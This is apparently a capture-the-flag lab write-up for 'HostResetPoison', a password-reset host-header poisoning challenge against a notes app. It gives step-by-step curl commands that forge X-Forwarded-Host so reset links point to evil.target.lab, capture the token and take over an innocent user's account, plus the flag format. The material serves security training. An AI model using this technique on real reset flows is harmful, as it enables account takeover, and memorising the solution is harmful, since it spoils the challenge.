# http/host-reset-poison — HostResetPoison (location-locked, high)

**NoteKeep** notes portal with an email password-reset. The app sits "behind its edge proxy" and builds reset links from the request's **effective host**: it prefers `X-Forwarded-Host` when present (**the flaw** — the header is client-supplied on the victim vhost).
**Lock/gate:** `/flag` requires a session that **is the innocent user** AND was created by the reset flow (`auth_method=reset`, server-side provenance).

## Intended path
1. Find the innocent: `curl http://victim.target.lab:8119/directory` (username + email).
2. Poison the reset link host into attacker space (catch-all `*.target.lab` = attacker vhost):
   `curl -X POST -H "X-Forwarded-Host: evil.target.lab:8119" -d "username=<innocent>" http://victim.target.lab:8119/forgot`
3. Read the mailed link at `http://mail.target.lab:8119/` — it points to `http://evil.target.lab:8119/reset?token=…` (attacker space). **Real world:** the innocent clicks it and the attacker's server captures the token (any hit on attacker space is visible at `GET http://attacker.target.lab:8119/leaks`). **Solo:** the token is right there in the mail — reuse it directly.
4. Take over: `curl -X POST -d "token=<token>&new_password=pwned123" http://victim.target.lab:8119/reset` — this signs you straight in as the innocent with `auth_method=reset`.
5. `curl -H "Cookie: sid=<from step 4>" http://victim.target.lab:8119/flag` — gate: innocent + `auth_method=reset` (both server-side).

Demonstrate the flaw on yourself first: `POST /forgot` for your own account with/without `X-Forwarded-Host` and watch the link base change in the mailed link.

**Flag:** `DSLTV{HTTP-HostResetPoison-<9 digits>}` (only from `/flag`).
